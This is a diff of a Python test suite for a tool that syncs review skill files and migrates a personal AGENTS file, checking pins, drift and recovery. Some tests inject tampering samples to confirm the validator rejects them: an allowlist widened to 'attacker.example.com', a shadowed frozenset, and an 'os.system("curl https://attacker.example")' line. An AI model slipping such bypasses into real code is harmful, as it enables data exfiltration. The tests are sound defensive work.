+        actual = self._verified_migration_fixture_pin(history, history.squash)
+        subtree_tree = self._fixture_git(
+            history.checkout,
+            "rev-parse",
+            f"{actual.sha}:{history.rule.source.as_posix()}",
+        )
+        manifest = SimpleNamespace(root_object_id=subtree_tree)
+        cases = {
+            "revision": SimpleNamespace(
+                repository=actual.repository,
+                sha="f" * 40,
+                tree=actual.tree,
+            ),
+            "root tree": SimpleNamespace(
+                repository=actual.repository,
+                sha=actual.sha,
+                tree="e" * 40,
+            ),
+        }
+        with mock.patch.object(
+            SYNC_MODULE,
+            "_CANONICAL_REVIEW_SYNC_RULE",
+            history.rule,
+        ):
+            for label, pin in cases.items():
+                with (
+                    self.subTest(label=label),
+                    self.assertRaisesRegex(
+                        SYNC_MODULE.SyncError,
+                        f"live {label} differs from the source lock",
+                    ),
+                ):
+                    SYNC_MODULE._bind_canonical_review_migration_source(
+                        SOURCE_LOCK_MODULE,
+                        history.checkout,
+                        pin,
+                        manifest,
+                        history.rule,
+                        complete_checkout_verification=(
+                            self._complete_checkout_verification(
+                                SimpleNamespace(
+                                    name=history.checkout.name,
+                                    repository=pin.repository,
+                                    sha=pin.sha,
+                                    tree=pin.tree,
+                                ),
+                                source_root=history.checkout.parent,
+                            )
+                        ),
+                    )
+
+    def test_canonical_review_migration_requires_complete_checkout_proof(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.squash)
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "locally complete checkout verification receipt",
+        ):
+            self._bind_migration_fixture(history, pin, complete=False)
+
+    def test_canonical_review_migration_rejects_missing_ancestry_object(
+        self,
+    ) -> None:
+        history = self._canonical_migration_history()
+        pin = self._verified_migration_fixture_pin(history, history.future_merge)
+        object_path = (
+            history.checkout
+            / ".git"
+            / "objects"
+            / history.squash[:2]
+            / history.squash[2:]
+        )
+        self.assertTrue(object_path.is_file())
+        object_path.unlink()
+
+        with self.assertRaises(SOURCE_LOCK_MODULE.SourceLockError):
+            self._bind_migration_fixture(history, pin)
+
     def test_review_sync_removes_stale_public_surfaces(self) -> None:
         rule, target = self._create_canonical_regular_file_overlay_rule()
         stale_surfaces = (
@@ -1460,24 +2392,52 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             ).is_file()
         )
 
-    def test_authoritative_review_sync_migrates_personal_agents_after_tree(
+    def test_approved_review_sync_migrates_personal_agents_after_tree(
         self,
     ) -> None:
         rule, target = self._create_canonical_regular_file_overlay_rule(
             authoritative=True
         )
         agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
         observed_installed_tree: list[bool] = []
-        real_migrate = (
-            SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync
+        events: list[str] = []
+        real_migrate = SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync
+        real_assert_installed = (
+            SYNC_MODULE._assert_installed_regular_file_overlay_receipt
         )
+        real_rename = SYNC_MODULE._rename_regular_file_overlay_noreplace
 
-        def migrate_after_tree(repo_binding):
+        def migrate_after_tree(
+            repo_binding,
+            migrated_rule,
+            locked_source,
+            installed_migration_receipt,
+        ):
             observed_installed_tree.append(
                 not (target / "old-marker").exists()
                 and (target / "SKILL.md").read_bytes() == b"public\n"
             )
-            return real_migrate(repo_binding)
+            installed_receipt = installed_migration_receipt.installed_receipt
+            os.fstat(installed_receipt.root_descriptor)
+            os.fstat(installed_receipt.target_parent.descriptor)
+            return real_migrate(
+                repo_binding,
+                migrated_rule,
+                locked_source,
+                installed_migration_receipt,
+            )
+
+        def record_installed_validation(receipt, *, label):
+            real_assert_installed(receipt, label=label)
+            events.append(f"validate:{label}")
+
+        def record_rename(*args, **kwargs):
+            result = real_rename(*args, **kwargs)
+            if args[4] == SYNC_MODULE.PERSONAL_AGENTS_TARGET.name:
+                events.append("AGENTS publish")
+            return result
 
         with (
             mock.patch.object(
@@ -1490,11 +2450,31 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 "_migrate_personal_agents_after_canonical_review_sync",
                 side_effect=migrate_after_tree,
             ),
+            mock.patch.object(
+                SYNC_MODULE,
+                "_assert_installed_regular_file_overlay_receipt",
+                side_effect=record_installed_validation,
+            ),
+            mock.patch.object(
+                SYNC_MODULE,
+                "_rename_regular_file_overlay_noreplace",
+                side_effect=record_rename,
+            ),
         ):
             expected = SYNC_MODULE._migrated_personal_agents_bytes(legacy)
-            SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
 
         self.assertEqual(observed_installed_tree, [True])
+        install_validation = events.index("validate:post-install validation")
+        agents_publish = events.index("AGENTS publish")
+        post_agents_validation = events.index("validate:post-AGENTS publication")
+        self.assertLess(install_validation, agents_publish)
+        self.assertLess(agents_publish, post_agents_validation)
         self.assertEqual(agents.read_bytes(), expected)
         self.assertEqual(
             SYNC_MODULE._personal_agents_review_guidance_state(expected),
@@ -1509,7 +2489,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         )
         agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
         source = self.source_root / rule.repo / rule.source
-        locked_sources = self._locked_bug_triage_source(rule, source)
+        locked_sources = self._locked_canonical_review_source(rule, source)
 
         with mock.patch.object(
             SYNC_MODULE,
@@ -1526,21 +2506,578 @@ class PrivateOverlaySyncTests(unittest.TestCase):
 
         self.assertEqual(agents.read_bytes(), expected)
 
+    def test_legacy_review_source_sync_keeps_legacy_personal_agents(self) -> None:
+        rule, target = self._create_canonical_regular_file_overlay_rule(
+            authoritative=True
+        )
+        agents, legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(
+            rule,
+            source,
+            legacy=True,
+        )
+
+        SYNC_MODULE.sync_sources(
+            self.repo_root,
+            self.source_root,
+            (rule,),
+            locked_sources=locked_sources,
+        )
+
+        self.assertEqual(agents.read_bytes(), legacy)
+        self.assertFalse((target / "old-marker").exists())
+        self.assertEqual((target / "SKILL.md").read_bytes(), b"public\n")
+
+    def test_unlocked_authoritative_review_sync_fails_before_write(self) -> None:
+        rule, target = self._create_canonical_regular_file_overlay_rule(
+            authoritative=True
+        )
+        agents, legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        prior_source = self.source_root / "prior-repo" / "prior-source"
+        prior_source.mkdir(parents=True)
+        (prior_source / "marker.txt").write_text("prior\n", encoding="utf-8")
+        prior_rule = SYNC_MODULE.SyncRule(
+            repo="prior-repo",
+            source=Path("prior-source"),
+            target=Path("prior-target"),
+        )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "requires a verified source pin",
+        ):
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (prior_rule, rule),
+            )
+
+        self.assertEqual(agents.read_bytes(), legacy)
+        self.assertFalse((self.repo_root / prior_rule.target).exists())
+        self.assertTrue((target / "old-marker").is_file())
+
+    def test_unknown_locked_review_source_fails_before_write(self) -> None:
+        rule, target = self._create_canonical_regular_file_overlay_rule(
+            authoritative=True
+        )
+        agents, legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        source_pin = SYNC_MODULE._VerifiedLockedSourcePin(
+            repository=SYNC_MODULE.CANONICAL_REVIEW_MIGRATION_POLICY.repository,
+            revision="d" * 40,
+            root_tree="c" * 40,
+        )
+        locked_sources = self._locked_bug_triage_source(
+            rule,
+            source,
+            source_pin=source_pin,
+            checkout_verification=self._complete_checkout_verification(
+                SimpleNamespace(
+                    name=rule.repo,
+                    repository=source_pin.repository,
+                    sha=source_pin.revision,
+                    tree=source_pin.root_tree,
+                )
+            ),
+            root_object_id=(
+                SYNC_MODULE.CANONICAL_REVIEW_MIGRATION_POLICY.approved_review_subtree_tree
+            ),
+        )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "migration receipt does not match its source",
+        ):
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
+
+        self.assertEqual(agents.read_bytes(), legacy)
+        self.assertTrue((target / "old-marker").is_file())
+
+    def test_personal_agents_migration_accepts_timestamp_only_churn(self) -> None:
+        def materialize_timestamp(agents, _legacy):
+            metadata = agents.stat()
+            os.utime(
+                agents,
+                ns=(metadata.st_atime_ns, metadata.st_mtime_ns + 1_000_000_000),
+            )
+
+        agents, _legacy, result = self._migrate_personal_agents_after_first_read(
+            materialize_timestamp
+        )
+
+        self.assertIsNotNone(result)
+        self.assertTrue(result.is_dir())
+        self.assertEqual(
+            SYNC_MODULE._personal_agents_review_guidance_state(agents.read_bytes()),
+            "current",
+        )
+
+    def _assert_post_install_tree_mutation_blocks_agents_migration(
+        self,
+        mutate,
+    ) -> None:
+        rule, target = self._create_canonical_regular_file_overlay_rule(
+            authoritative=True
+        )
+        agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
+        real_replace = SYNC_MODULE._replace_target_with_regular_file_overlays
+        mutation_ran = False
+
+        def replace_then_mutate(*args, **kwargs):
+            nonlocal mutation_ran
+            result = real_replace(*args, **kwargs)
+            mutate(target)
+            mutation_ran = True
+            return result
+
+        with (
+            mock.patch.object(
+                SYNC_MODULE,
+                "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
+                legacy_digest,
+            ),
+            mock.patch.object(
+                SYNC_MODULE,
+                "_replace_target_with_regular_file_overlays",
+                side_effect=replace_then_mutate,
+            ),
+            self.assertRaisesRegex(
+                SYNC_MODULE.SyncError,
+                "installed.*(binding|manifest).*changed",
+            ),
+        ):
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
+
+        self.assertTrue(mutation_ran)
+        self.assertEqual(agents.read_bytes(), legacy)
+
+    def test_installed_tree_root_replacement_before_migration_keeps_agents(
+        self,
+    ) -> None:
+        def replace_root(target):
+            detached = target.with_name(f"{target.name}.detached")
+            target.rename(detached)
+            shutil.copytree(detached, target)
+
+        self._assert_post_install_tree_mutation_blocks_agents_migration(replace_root)
+
+    def test_installed_tree_content_mutation_before_migration_keeps_agents(
+        self,
+    ) -> None:
+        self._assert_post_install_tree_mutation_blocks_agents_migration(
+            lambda target: (target / "SKILL.md").write_bytes(b"mutated\n"),
+        )
+
+    def test_installed_tree_receipt_must_match_exact_candidate_manifest(
+        self,
+    ) -> None:
+        rule, _target = self._create_canonical_regular_file_overlay_rule(
+            authoritative=True
+        )
+        agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
+        real_replace = SYNC_MODULE._replace_target_with_regular_file_overlays
+
+        def replace_with_forged_manifest(*args, **kwargs):
+            result = real_replace(*args, **kwargs)
+            forged_manifest = SYNC_MODULE._RegularFileOverlayTreeManifest(
+                root_identity=result.installed_receipt.manifest.root_identity,
+                entries=(),
+                total_bytes=0,
+            )
+            return dataclasses.replace(
+                result,
+                installed_receipt=dataclasses.replace(
+                    result.installed_receipt,
+                    manifest=forged_manifest,
+                ),
+            )
+
+        with (
+            mock.patch.object(
+                SYNC_MODULE,
+                "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
+                legacy_digest,
+            ),
+            mock.patch.object(
+                SYNC_MODULE,
+                "_replace_target_with_regular_file_overlays",
+                side_effect=replace_with_forged_manifest,
+            ),
+            self.assertRaisesRegex(
+                SYNC_MODULE.SyncError,
+                "installed manifest differs from candidate",
+            ),
+        ):
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
+
+        self.assertEqual(agents.read_bytes(), legacy)
+
+    def test_final_prepublish_tree_drift_blocks_compact_agents_rename(
+        self,
+    ) -> None:
+        rule, target = self._create_canonical_regular_file_overlay_rule(
+            authoritative=True
+        )
+        agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
+        real_register = SYNC_MODULE._register_regular_file_overlay_retained_entry
+        mutation_ran = False
+
+        def register_then_mutate(scope, name, entry):
+            nonlocal mutation_ran
+            result = real_register(scope, name, entry)
+            if not mutation_ran and scope.target_parent.path == agents.parent:
+                skill = target / "SKILL.md"
+                before = skill.stat()
+                skill.write_bytes(b"same-inode drift before compact publish\n")
+                after = skill.stat()
+                self.assertEqual(
+                    (before.st_dev, before.st_ino),
+                    (after.st_dev, after.st_ino),
+                )
+                mutation_ran = True
+            return result
+
+        with (
+            mock.patch.object(
+                SYNC_MODULE,
+                "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
+                legacy_digest,
+            ),
+            mock.patch.object(
+                SYNC_MODULE,
+                "_register_regular_file_overlay_retained_entry",
+                side_effect=register_then_mutate,
+            ),
+            self.assertRaisesRegex(
+                SYNC_MODULE.SyncError,
+                "final pre-AGENTS publication.*manifest changed",
+            ),
+        ):
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
+
+        self.assertTrue(mutation_ran)
+        self.assertFalse(agents.exists())
+        recovery_root = self.repo_root / SYNC_MODULE.REGULAR_FILE_OVERLAY_RECOVERY_ROOT
+        self.assertIn(
+            legacy,
+            [path.read_bytes() for path in recovery_root.rglob("*") if path.is_file()],
+        )
+
+    def test_bound_plain_file_accepts_materialization_timestamp_hint(self) -> None:
+        agents, legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        real_hint = SYNC_MODULE._overlay_file_timestamp_hint
+        real_read = SYNC_MODULE._read_regular_file_overlay_descriptor
+        hint_calls = 0
+        read_calls = 0
+
+        def materialized_hint(metadata):
+            nonlocal hint_calls
+            hint_calls += 1
+            mtime_ns, ctime_ns = real_hint(metadata)
+            if hint_calls <= 2:
+                return mtime_ns, ctime_ns
+            return mtime_ns, ctime_ns + 1
+
+        def counted_read(descriptor, *, byte_limit):
+            nonlocal read_calls
+            read_calls += 1
+            return real_read(descriptor, byte_limit=byte_limit)
+
+        with contextlib.ExitStack() as stack:
+            parent = SYNC_MODULE._pin_regular_file_overlay_directory(
+                stack,
+                agents.parent,
+                label="personal AGENTS parent",
+            )
+            pinned = SYNC_MODULE._pin_regular_file_overlay_entry(
+                stack,
+                parent.descriptor,
+                agents.name,
+                label="personal AGENTS source",
+            )
+            with (
+                mock.patch.object(
+                    SYNC_MODULE,
+                    "_overlay_file_timestamp_hint",
+                    side_effect=materialized_hint,
+                ),
+                mock.patch.object(
+                    SYNC_MODULE,
+                    "_read_regular_file_overlay_descriptor",
+                    side_effect=counted_read,
+                ),
+            ):
+                snapshot = SYNC_MODULE._read_bound_plain_file_semantically(
+                    parent.descriptor,
+                    agents.name,
+                    pinned,
+                    byte_limit=len(legacy),
+                    label="personal AGENTS source",
+                )
+
+        self.assertEqual(snapshot.data, legacy)
+        self.assertEqual(read_calls, 2)
+
+    def test_bound_plain_file_caps_persistent_timestamp_revalidation(self) -> None:
+        agents, legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        real_hint = SYNC_MODULE._overlay_file_timestamp_hint
+        real_read = SYNC_MODULE._read_regular_file_overlay_descriptor
+        hint_calls = 0
+        read_calls = 0
+
+        def unstable_hint(metadata):
+            nonlocal hint_calls
+            hint_calls += 1
+            mtime_ns, ctime_ns = real_hint(metadata)
+            return mtime_ns, ctime_ns + hint_calls
+
+        def counted_read(descriptor, *, byte_limit):
+            nonlocal read_calls
+            read_calls += 1
+            return real_read(descriptor, byte_limit=byte_limit)
+
+        with contextlib.ExitStack() as stack:
+            parent = SYNC_MODULE._pin_regular_file_overlay_directory(
+                stack,
+                agents.parent,
+                label="personal AGENTS parent",
+            )
+            pinned = SYNC_MODULE._pin_regular_file_overlay_entry(
+                stack,
+                parent.descriptor,
+                agents.name,
+                label="personal AGENTS source",
+            )
+            with (
+                mock.patch.object(
+                    SYNC_MODULE,
+                    "_overlay_file_timestamp_hint",
+                    side_effect=unstable_hint,
+                ),
+                mock.patch.object(
+                    SYNC_MODULE,
+                    "_read_regular_file_overlay_descriptor",
+                    side_effect=counted_read,
+                ),
+                self.assertRaisesRegex(
+                    SYNC_MODULE.SyncError,
+                    "timestamp revalidation did not stabilize",
+                ) as raised,
+            ):
+                SYNC_MODULE._read_bound_plain_file_semantically(
+                    parent.descriptor,
+                    agents.name,
+                    pinned,
+                    byte_limit=len(legacy),
+                    label="personal AGENTS source",
+                )
+
+        self.assertEqual(read_calls, 2)
+        self.assertNotIn("content changed", str(raised.exception))
+
+    def test_personal_agents_migration_rejects_content_drift(self) -> None:
+        def change_content(agents, legacy):
+            drifted = legacy.replace(b"Synthetic", b"synthetiC", 1)
+            self.assertEqual(len(drifted), len(legacy))
+            agents.write_bytes(drifted)
+            metadata = agents.stat()
+            os.utime(
+                agents,
+                ns=(metadata.st_atime_ns, metadata.st_mtime_ns + 1_000_000_000),
+            )
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "content changed during timestamp revalidation",
+        ):
+            self._migrate_personal_agents_after_first_read(change_content)
+
+    def test_personal_agents_migration_rejects_object_replacement(self) -> None:
+        def replace_object(agents, legacy):
+            agents.replace(agents.with_name("AGENTS.replaced.md"))
+            agents.write_bytes(legacy)
+            agents.chmod(0o644)
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "binding changed: object identity mismatch",
+        ):
+            self._migrate_personal_agents_after_first_read(replace_object)
+
+    def test_personal_agents_migration_rejects_mode_drift(self) -> None:
+        def change_mode(agents, _legacy):
+            agents.chmod(0o600)
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "access policy changed",
+        ):
+            self._migrate_personal_agents_after_first_read(change_mode)
+
+    def test_personal_agents_migration_rejects_link_count_drift(self) -> None:
+        def add_hard_link(agents, _legacy):
+            os.link(agents, agents.with_name("AGENTS.alias.md"))
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "access policy changed",
+        ):
+            self._migrate_personal_agents_after_first_read(add_hard_link)
+
+    def test_personal_agents_migration_rejects_ownership_drift(self) -> None:
+        real_fstat = SYNC_MODULE.os.fstat
+        drift_owner = False
+
+        def mark_owner_drift(_agents, _legacy):
+            nonlocal drift_owner
+            drift_owner = True
+
+        def owner_drifting_fstat(descriptor):
+            metadata = real_fstat(descriptor)
+            if not drift_owner or not stat.S_ISREG(metadata.st_mode):
+                return metadata
+            return SimpleNamespace(
+                st_dev=metadata.st_dev,
+                st_ino=metadata.st_ino,
+                st_mode=metadata.st_mode,
+                st_nlink=metadata.st_nlink,
+                st_uid=metadata.st_uid + 1,
+                st_size=metadata.st_size,
+                st_mtime_ns=metadata.st_mtime_ns,
+                st_ctime_ns=metadata.st_ctime_ns,
+            )
+
+        with (
+            mock.patch.object(
+                SYNC_MODULE.os,
+                "fstat",
+                side_effect=owner_drifting_fstat,
+            ),
+            self.assertRaisesRegex(
+                SYNC_MODULE.SyncError,
+                "access policy changed",
+            ),
+        ):
+            self._migrate_personal_agents_after_first_read(mark_owner_drift)
+
+    def test_personal_agents_migration_classifies_missing_path(self) -> None:
+        def remove_path(agents, _legacy):
+            agents.unlink()
+
+        with self.assertRaisesRegex(
+            SYNC_MODULE.SyncError,
+            "pathname is missing during revalidation",
+        ):
+            self._migrate_personal_agents_after_first_read(remove_path)
+
+    def test_personal_agents_migration_classifies_unreadable_path(self) -> None:
+        agents, _legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        parent_descriptor = os.open(agents.parent, os.O_RDONLY | os.O_DIRECTORY)
+        try:
+            with (
+                mock.patch.object(
+                    SYNC_MODULE.os,
+                    "stat",
+                    side_effect=PermissionError(
+                        errno.EACCES,
+                        "synthetic unreadable path",
+                    ),
+                ),
+                self.assertRaisesRegex(
+                    SYNC_MODULE.SyncError,
+                    "pathname is unreadable during revalidation",
+                ),
+            ):
+                SYNC_MODULE._stat_bound_plain_file_name(
+                    parent_descriptor,
+                    agents.name,
+                    label="personal AGENTS source",
+                )
+        finally:
+            os.close(parent_descriptor)
+
+    def test_personal_agents_migration_classifies_path_revalidation_failure(
+        self,
+    ) -> None:
+        agents, _legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
+        parent_descriptor = os.open(agents.parent, os.O_RDONLY | os.O_DIRECTORY)
+        try:
+            with (
+                mock.patch.object(
+                    SYNC_MODULE.os,
+                    "stat",
+                    side_effect=OSError(
+                        errno.EIO,
+                        "synthetic revalidation failure",
+                    ),
+                ),
+                self.assertRaisesRegex(
+                    SYNC_MODULE.SyncError,
+                    "pathname revalidation failed",
+                ),
+            ):
+                SYNC_MODULE._stat_bound_plain_file_name(
+                    parent_descriptor,
+                    agents.name,
+                    label="personal AGENTS source",
+                )
+        finally:
+            os.close(parent_descriptor)
+
     def test_current_personal_agents_migration_is_inode_stable(self) -> None:
         rule, _target = self._create_canonical_regular_file_overlay_rule(
             authoritative=True
         )
         agents, legacy, legacy_digest = self._synthetic_legacy_personal_agents()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
 
         with mock.patch.object(
             SYNC_MODULE,
             "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
             legacy_digest,
         ):
-            SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
             migrated = agents.read_bytes()
             migrated_inode = agents.stat().st_ino
-            SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
 
         self.assertEqual(agents.read_bytes(), migrated)
         self.assertEqual(agents.stat().st_ino, migrated_inode)
@@ -1615,9 +3152,12 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 ),
             }
             for name, data in cases.items():
-                with self.subTest(name=name), self.assertRaisesRegex(
-                    SYNC_MODULE.SyncError,
-                    "exact legacy or migrated state",
+                with (
+                    self.subTest(name=name),
+                    self.assertRaisesRegex(
+                        SYNC_MODULE.SyncError,
+                        "exact legacy or migrated state",
+                    ),
                 ):
                     SYNC_MODULE._migrated_personal_agents_bytes(data)
 
@@ -1634,6 +3174,8 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             1,
         )
         agents.write_bytes(drifted)
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
 
         with (
             mock.patch.object(
@@ -1646,7 +3188,12 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 "exact legacy or migrated state",
             ),
         ):
-            SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
 
         self.assertEqual(agents.read_bytes(), drifted)
         self.assertFalse((target / "old-marker").exists())
@@ -1692,18 +3239,14 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                     "binding changed",
                 ),
             ):
-                SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync(
-                    repo_binding
-                )
+                SYNC_MODULE._migrate_personal_agents_guidance(repo_binding)
 
         self.assertTrue(rebound)
         self.assertFalse(agents.exists())
         self.assertEqual(moved.read_bytes(), legacy)
         recovery_root = self.repo_root / SYNC_MODULE.REGULAR_FILE_OVERLAY_RECOVERY_ROOT
         retained_payloads = [
-            path.read_bytes()
-            for path in recovery_root.rglob("*")
-            if path.is_file()
+            path.read_bytes() for path in recovery_root.rglob("*") if path.is_file()
         ]
         self.assertIn(replacement, retained_payloads)
 
@@ -1725,9 +3268,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 "PERSONAL_AGENTS_LEGACY_REVIEW_BLOCK_SHA256",
                 legacy_digest,
             ):
-                SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync(
-                    repo_binding
-                )
+                SYNC_MODULE._migrate_personal_agents_guidance(repo_binding)
 
         real_migrate_bytes = SYNC_MODULE._migrated_personal_agents_bytes
         replaced = False
@@ -1756,9 +3297,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 ),
                 self.assertRaisesRegex(SYNC_MODULE.SyncError, "binding changed"),
             ):
-                SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync(
-                    repo_binding
-                )
+                SYNC_MODULE._migrate_personal_agents_guidance(repo_binding)
 
         self.assertTrue(replaced)
         self.assertEqual(agents.read_bytes(), replacement)
@@ -1802,14 +3341,10 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                     SYNC_MODULE.SyncError,
                     "simulated publish failure",
                 ):
-                    SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync(
-                        repo_binding
-                    )
+                    SYNC_MODULE._migrate_personal_agents_guidance(repo_binding)
                 self.assertEqual(agents.read_bytes(), legacy)
                 self.assertTrue(
-                    SYNC_MODULE._migrate_personal_agents_after_canonical_review_sync(
-                        repo_binding
-                    )
+                    SYNC_MODULE._migrate_personal_agents_guidance(repo_binding)
                 )
 
         self.assertTrue(failed)
@@ -1824,6 +3359,8 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         agents, legacy, _legacy_digest = self._synthetic_legacy_personal_agents()
         missing = self.source_root / rule.repo / rule.source / "SKILL.md"
         missing.unlink()
+        source = self.source_root / rule.repo / rule.source
+        locked_sources = self._locked_canonical_review_source(rule, source)
 
         with (
             mock.patch.object(
@@ -1832,7 +3369,12 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             ) as migrate,
             self.assertRaisesRegex(SYNC_MODULE.SyncError, "missing required file"),
         ):
-            SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
+            SYNC_MODULE.sync_sources(
+                self.repo_root,
+                self.source_root,
+                (rule,),
+                locked_sources=locked_sources,
+            )
 
         migrate.assert_not_called()
         self.assertEqual(agents.read_bytes(), legacy)
@@ -1940,7 +3482,9 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         target = self.repo_root / rule.target
         stale_reference = target / "references" / "triage-report.md"
         stale_reference.parent.mkdir(parents=True)
-        stale_reference.write_text("retired generic triage template\n", encoding="utf-8")
+        stale_reference.write_text(
+            "retired generic triage template\n", encoding="utf-8"
+        )
 
         SYNC_MODULE.sync_sources(self.repo_root, self.source_root, (rule,))
 
@@ -2076,9 +3620,9 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 )
                 self.assertEqual(auth_state, "present")
                 self.assertEqual(request.full_url, allowed_url)
-                expected = base64.b64encode(
-                    f"{user}:{token}".encode("utf-8")
-                ).decode("ascii")
+                expected = base64.b64encode(f"{user}:{token}".encode("utf-8")).decode(
+                    "ascii"
+                )
                 self.assertEqual(
                     request.get_header("Authorization"),
                     f"Basic {expected}",
@@ -2167,9 +3711,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         self.addCleanup(sys.modules.pop, module_name, None)
 
         allowed_url = "https://engci-private-sjc.cisco.com/job/example"
-        hostile_proxy = (
-            "http://fixture-user:fixture-token@proxy.invalid:8080"
-        )
+        hostile_proxy = "http://fixture-user:fixture-token@proxy.invalid:8080"
         request = probe.urllib.request.Request(allowed_url)
         with (
             mock.patch.dict(
@@ -2260,9 +3802,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         self,
     ) -> None:
         rule, _source, _interface = self._write_current_bug_triage_source(
-            appended_script=(
-                '\nALLOWED_HOSTS = frozenset({"attacker.example.com"})\n'
-            )
+            appended_script=('\nALLOWED_HOSTS = frozenset({"attacker.example.com"})\n')
         )
 
         with self.assertRaisesRegex(
@@ -2329,8 +3869,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
     def test_bug_triage_sync_rejects_frozenset_shadow(self) -> None:
         rule, _source, _interface = self._write_current_bug_triage_source(
             prepended_script=(
-                "frozenset = lambda values: "
-                'set(values) | {"attacker.example.com"}\n\n'
+                'frozenset = lambda values: set(values) | {"attacker.example.com"}\n\n'
             )
         )
 
@@ -2389,9 +3928,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
 
     def test_bug_triage_sync_rejects_allowed_url_guard_rebinding(self) -> None:
         rule, _source, _interface = self._write_current_bug_triage_source(
-            appended_script=(
-                "\n_ensure_allowed_url = urllib.parse.urlparse\n"
-            )
+            appended_script=("\n_ensure_allowed_url = urllib.parse.urlparse\n")
         )
 
         with self.assertRaisesRegex(
@@ -2551,9 +4088,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 "    set(values) | {'attacker.example.com'}\n"
                 ")\n\n"
             ),
-            appended_script=(
-                "\nnamespace['froze' + 'nset'] = original_frozenset\n"
-            ),
+            appended_script=("\nnamespace['froze' + 'nset'] = original_frozenset\n"),
         )
 
         with self.assertRaisesRegex(
@@ -2606,8 +4141,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             "system": b'\nos.system("curl https://attacker.example")\n',
             "alternate-base64": b"\nextra = base64.urlsafe_b64encode(b'x')\n",
             "header-reader": (
-                b"\ndef _single_line_header(headers, name):\n"
-                b"    return headers\n"
+                b"\ndef _single_line_header(headers, name):\n    return headers\n"
             ),
         }
         for label, suffix in drifts.items():
@@ -2769,9 +4303,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
